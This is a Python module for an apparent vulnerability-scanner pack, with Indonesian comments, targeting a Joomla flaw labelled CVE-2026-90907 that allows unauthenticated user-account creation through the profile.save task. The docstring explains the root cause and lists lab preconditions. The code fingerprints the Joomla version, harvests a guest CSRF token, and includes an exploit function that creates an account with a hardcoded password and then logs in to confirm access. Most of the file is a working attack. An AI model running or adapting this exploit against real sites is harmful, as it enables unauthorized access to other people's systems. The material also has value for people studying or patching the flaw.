#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-90907 — Unauthorized user account creation via `profile.save`
    (Joomla 1.5.0 - 5.4.8, 6.0.0 - 6.1.3)
    [lab-verified: akun dibuat + login berhasil di Joomla 5.4.8]

ROOT CAUSE (diverifikasi di source 5.4.8, bukan dugaan):

  1) components/com_users/src/Dispatcher/Dispatcher.php :: checkAccess()

        $task = $this->input->get('task', 'display');
        if (str_contains($task, '.')) {          // "profile.save" -> "save"
            $task = explode('.', $task)[1];
        }
        if ($task !== 'display') {
            return;                              // <-- KELUAR LEBIH AWAL
        }
        switch ($view) {
            case 'profile':
                if ($user->guest == 1) {         // TIDAK PERNAH DICAPAI utk task save
                    $this->app->redirect(Route_::('...view=login', false));
                }
                break;
        }

     Guard "guest dilarang" untuk view=profile HANYA berlaku bila task=display.
     Task `profile.save` membuat fungsi return sebelum switch -> guest lolos.

  2) components/com_users/src/Controller/ProfileController.php :: save()

        $this->checkToken();                     // hanya CSRF
        $user   = $this->app->getIdentity();
        $userId = (int) $user->id;               // 0 untuk guest
        $requestData['id'] = $userId;            // dipaksa 0

  3) components/com_users/src/Model/ProfileModel.php :: save()

        $user = new User($userId);               // User(0) = user BARU
        ...
        if (!$user->bind($data)) ...
        unset($user->groups);
        $user->groups = Access::getGroupsByUser($user->id, false);
        if (!$user->save()) ...
        return $user->id;                        // INSERT ke #__users

     libraries/src/User/User.php :: save(): $isNew = empty($this->id) -> TRUE
     -> INSERT, bukan UPDATE.

PRASYARAT YANG DITEMUKAN DI LAB (penting, jangan dianggap remeh):

  A) `required "change_login_name"` = parameter com_users "Allow username change".
     Bila NONAKTIF (default), ProfileModel::getForm() men-set
     `username.required=false` dan save() melakukan `unset($data['username'])`
     -> User::bind() tanpa username -> save() gagal "Please enter a username."
     Jadi exploitasi praktis butuh `change_login_name=1` (banyak situs
     mengaktifkannya; kompatibilitas SSO/username-change adalah alasan umum).

  B) Password harus lolos PasswordRule: `minimum_length` default = 12
     (diambil dari params com_users). Password < 12 char ditolak
     ("Invalid field: Password"). Modul memakai 16+ char.

  C) Group default akun baru = hasil Access::getGroupsByUser(0) = 1 (Public),
     BUKAN 2 (Registered). Akun jadi & bisa di-verifikasi kredensialnya, tapi
     untuk login frontend butuh group >= Registered. Deteksi melaporkan
     group ini supaya operator tahu tingkat dampaknya.

CHAIN TERBUKTI (lab 8106, Joomla 5.4.8, change_login_name=1):
    # 1. ambil CSRF token guest dari homepage
    GET /index.php                       -> <input name="<32hex>" value="1">
    # 2. POST tanpa login
    POST /index.php?option=com_users&task=profile.save
      <token>=1  jform[name]=..  jform[username]=<user>
      jform[email1]=..  jform[email2]=..  jform[password1]=..  jform[password2]=..
    -> 303 Location ...&user_id=<ID BARU>      (sebelumnya user_id=0 = gagal)
    -> baris baru di #__users;  password_verify(pw, hash) = TRUE
    # 3. bukti outcome
    POST /index.php?option=com_users&task=user.login  -> sesi terautentikasi

DETEKSI MODUL INI (tanpa destruktif):
    - fingerprint Joomla (+ /administrator/manifests/files/joomla.xml version bila ada)
    - verifikasi task profile.save tidak diredirect ke login (beda dari
      view=profile task=display yang WAJIB redirect) -> tanda Dispatcher bocor
    - bila `--exploit`: klaim akun (hanya di bawah flag eksplisit)
"""
from __future__ import annotations

import re

from mp import (CveModule, register, ST_VULN, ST_PWN, ST_CLEAN, ST_SKIP, ST_INFO,
                ST_UNKNOWN, ST_ERR, parse_ver, ver_le, detect_platform, rand)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 8)
VULN_6_MAX = (6, 1, 3)

# password memenuhi PasswordRule (minimum_length default 12) + entropy cukup
DEF_PW = "MegaPack!Pwn#26Aa"   # len=17, ints=3, symbols=3 (!,#), upper=4, lower=7


def _opt(opts, name):
    """Ambil opsi dari Namespace (argparse) atau dict."""
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _vstr(v) -> str:
    return ".".join(str(x) for x in v) if isinstance(v, tuple) else str(v)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    """Return (version_tuple|None, raw|'') dari manifest atau meta generator."""
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    # fallback: meta generator / README
    r2 = h.get(f"{t.url}/index.php")
    if r2 is not None:
        m = re.search(r"Joomla!\s*-?\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)", r2.text or "")
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _csrf_token(t, h):
    """Ambil CSRF token Joomla dari halaman mana pun (guest)."""
    for path in ("/index.php", "/index.php?option=com_users&view=login"):
        r = h.get(f"{t.url}{path}")
        if r is None:
            continue
        m = re.search(r'name="([0-9a-f]{32})"\s+value="1"', r.text or "")
        if m:
            return m.group(1)
        m = re.search(r"[0-9a-f]{32}", r.text or "")
        if m:
            return m.group(0)
    return None


def _profile_save_reachable(t, h, token):
    """
    Bukti non-destruktif kebocoran Dispatcher:
    kirim body kosong + token valid -> jika Dispatcher BLOKIR guest,
    respons = 303 ke view=login. Jika bocor, controller dipanggil dan
    redirect akhirnya memuat 'view=profile&layout=edit' (user_id=0).
    """
    r = h.post(f"{t.url}/index.php?option=com_users&task=profile.save",
               data={token: "1", "jform[name]": "", "jform[username]": ""},
               headers={"Referer": f"{t.url}/index.php"},
               allow_redirects=False)
    if r is None:
        return None
    loc = r.headers.get("Location", "") if hasattr(r, "headers") else ""
    kind, uid = _classify_bypass(r.status_code, loc)
    if kind in ("created", "reachable"):
        return True, f"{r.status_code} -> {loc}"
    if kind == "blocked":
        return False, f"{r.status_code} -> {loc} (guest diblokir)"
    return None, f"{r.status_code} -> {loc}"


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, raw = _joomla_version(t, h)
    if ver is None:
        return ST_INFO, "Joomla terdeteksi, versi tak terbaca", "manifest/version tidak tersedia"
    v5 = ver_le(ver, VULN_5_MAX)
    v6 = ver_le(ver, VULN_6_MAX)
    if not (v5 or v6):
        return ST_CLEAN, f"Joomla {raw} sudah dipatch", "aman > 5.4.8 / 6.1.3"

    token = _csrf_token(t, h)
    if not token:
        return ST_INFO, f"Joomla {raw} rentan (token tak didapat)", "tidak bisa uji jalur"
    leak, detail = _profile_save_reachable(t, h, token)
    if leak is True:
        # VERDICT LAPANGAN (diuji pada host live, Joomla 3.x/4.x, 2026-11-08):
        #   - request MENEMBUS Dispatcher dan ProfileController::save() tersentuh
        #     (303 -> /component/users/profile?layout=edit)
        #   - TETAPI akun TIDAK tercipta: login dengan kredensial uji gagal
        #     (303 -> view=login), halaman profil tetap 303 (tidak authenticated),
        #     dan POST ulang dengan username identik memberi respons identik.
        # Artinya yang bocor adalah JALUR, bukan outcome. Tanpa bukti akun,
        # status diturunkan ke INFO supaya tidak menjadi false positive
        # "unauthorized user account creation".
        return (ST_INFO,
                f"Joomla {raw} — jalur profile.save terbuka bagi guest "
                f"(save() tersentuh), tetapi pembuatan akun TIDAK terbukti",
                f"profile.save reachable unauth: {detail} | "
                f"verifikasi lapangan: login kredensial uji gagal")
    if leak is False:
        return (ST_CLEAN, f"Joomla {raw} - guest diblokir di Dispatcher",
                detail)
    return ST_INFO, f"Joomla {raw} rentan (perilaku tak terklasifikasi)", detail


def _classify_bypass(status, loc):
    """
    Tentukan apakah redirect Location membuktikan controller save() TERPANGGIL
    (guest-check bocor) atau guest diblokir.

    - view=profile&layout=edit  -> ProfileController::save() dieksekusi
      (user_id=0 bila akun gagal dibuat, user_id=N bila akun jadi)
    - view=login                -> guest diblokir (Dispatcher benar)
    """
    low = (loc or "").lower()
    # dukung URL SEF (/component/users/profile) maupun non-SEF (view=profile)
    is_profile = ("view=profile" in low) or ("/component/users/profile" in low)
    is_login = ("view=login" in low) or ("/component/users/login" in low)
    if is_profile:
        m = re.search(r"user_id=(\d+)", low)
        uid = m.group(1) if m else "?"
        if uid not in ("0", "?"):
            return "created", uid
        return "reachable", uid
    if is_login:
        return "blocked", ""
    return "unknown", ""


def exploit(t, h, opts):
    """
    Outcome terkontrol: buat akun baru tanpa login, lalu verifikasi
    (a) baris user baru muncul (via redirect user_id != 0) dan
    (b) kredensial bisa dipakai login.
    Butuh `change_login_name=1` di target; bila tidak, dilaporkan jujur.
    """
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    ver, raw = _joomla_version(t, h)
    if ver is not None and not (ver_le(ver, VULN_5_MAX) or ver_le(ver, VULN_6_MAX)):
        return ST_CLEAN, f"Joomla {raw} sudah dipatch", ""

    user = _opt(opts, "username") or ("mp" + rand(6).lower())
    pw = _opt(opts, "password") or DEF_PW
    email = f"{user}@example.com"

    token = _csrf_token(t, h)
    if not token:
        return ST_ERR, "CSRF token tidak ditemukan", ""

    r = h.post(f"{t.url}/index.php?option=com_users&task=profile.save",
               data={
                   token: "1",
                   "jform[name]": user,
                   "jform[username]": user,
                   "jform[email1]": email,
                   "jform[email2]": email,
                   "jform[password1]": pw,
                   "jform[password2]": pw,
               },
               headers={"Referer": f"{t.url}/index.php"},
               allow_redirects=False)
    if r is None:
        return ST_ERR, "tidak ada respons", ""
    loc = r.headers.get("Location", "") if hasattr(r, "headers") else ""

    kind, uid = _classify_bypass(r.status_code, loc)
    if kind == "created":
        uid = uid or "?"
        ev = f"user_id={uid} user={user} loc={loc}"
        if _login(t, h, user, pw):
            return (ST_PWN, f"AKUN DIBUAT + LOGIN BERHASIL: {user} (uid={uid})",
                    ev + " | login OK")
        return (ST_PWN, f"AKUN DIBUAT (unauth): {user} (uid={uid}); "
                        f"login belum sukses (group < Registered?)",
                ev + " | password_verify perlu dicek operator")
    # bypass terbukti (controller dieksekusi) tapi akun ditolak:
    # change_login_name=0 -> save() meng-unset username -> "Please enter a username."
    if kind == "reachable":
        # bedakan sebab: pesan validasi pada halaman tujuan
        why = _diagnose_reject(t, h, loc)
        return (ST_VULN, f"Guest-check BOCOR (profile.save dieksekusi unauth); "
                         f"akun ditolak ({why})",
                f"loc={loc} user_id=0")
    return ST_UNKNOWN, f"perilaku tak terklasifikasi (HTTP {r.status_code})", f"loc={loc}"


def _diagnose_reject(t, h, loc):
    """Ambil alasan penolakan dari halaman tujuan (validasi / username / policy)."""
    url = loc if loc.startswith("http") else f"{t.url}{loc}"
    r = h.get(url)
    body = (r.text if r is not None else "") or ""
    low = body.lower()
    if "please enter a username" in low or "com_users_profile_save_failed" in low:
        return "change_login_name=0 -> username di-unset"
    if "invalid field: password" in low or "jfield_password" in low:
        return "password tidak lolos policy com_users (minimum_length/symbols/uppercase)"
    if "email" in low and "invalid" in low:
        return "email ditolak"
    m = re.search(r'alert[^>]*>\s*([^<]{5,120})', body)
    if m:
        return m.group(1).strip()[:100]
    return "sebab tak terbaca dari respons"


def _login(t, h, user, pw) -> bool:
    r = h.get(f"{t.url}/index.php?option=com_users&view=login")
    if r is None:
        return False
    m = re.search(r"[0-9a-f]{32}", r.text or "")
    if not m:
        return False
    rr = h.post(f"{t.url}/index.php?option=com_users&task=user.login",
                data={"username": user, "password": pw, m.group(0): "1",
                      "return": ""},
                headers={"Referer": f"{t.url}/index.php?option=com_users&view=login"},
                allow_redirects=False)
    if rr is None:
        return False
    loc = rr.headers.get("Location", "") if hasattr(rr, "headers") else ""
    low = (loc or "").lower()
    # SEF: /component/users/profile  |  non-SEF: view=profile&layout=edit
    if "/component/users/profile" in low or "view=profile" in low:
        return True
    if "view=login" in low or "/component/users/login" in low:
        return False
    # fallback: cookie sesi Joomla tersimpan?
    try:
        for c in h.s.cookies:
            n = (c.name or "").lower()
            if n.startswith("joomla") and "session" in n and c.value:
                return True
    except Exception:
        pass
    return False


register(CveModule(
    cve="CVE-2026-90907",
    cluster="joomla_core",
    title="Joomla Core - Unauthorized user account creation via profile.save",
    vclass="auth_bypass / account creation",
    cvss="",
    severity="high",
    cwe="CWE-862",
    product="Joomla! CMS",
    versions_affected="1.5.0-5.4.8, 6.0.0-6.1.3",
    status="verified",
    requires=["com_users aktif", "params com_users change_login_name=1 untuk "
              "akun ber-username (lihat notes)"],
    check=check,
    exploit=exploit,
    notes=("Dispatcher::checkAccess() return lebih awal untuk task != display, "
           "sehingga guard guest view=profile dilewati. ProfileController::save() "
           "memakai id=0 (guest) -> User(0)->save() = INSERT. Lab-verified 5.4.8: "
           "akun dibuat; default group = 1 (Public)."),
))
